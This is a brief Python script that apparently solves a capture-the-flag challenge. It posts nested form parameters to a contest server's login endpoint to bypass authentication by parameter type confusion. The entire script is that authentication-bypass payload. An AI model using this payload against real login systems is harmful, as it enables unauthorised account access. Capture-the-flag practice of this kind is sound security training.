from requests import post

with post(
    "http://catexpress.ictf5.ninja/auth",
    data="username[username]=1&password[password]=1",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
) as req:
    print(req.url)
